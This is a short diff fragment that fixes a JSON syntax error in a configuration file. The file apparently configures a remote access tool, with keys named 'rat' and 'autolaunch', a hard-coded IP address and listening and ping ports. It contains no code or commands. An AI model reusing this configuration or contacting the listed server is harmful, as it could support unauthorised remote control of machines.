@@ -2,7 +2,7 @@
 	"version": 1.0,
 	"status": "None",
 	"rat": "None",
-	"autolaunch", "None",
+	"autolaunch": "None",
 	"ip": "2.186.165.58",
 	"port": 6464,
 	"ping_port": 7979,
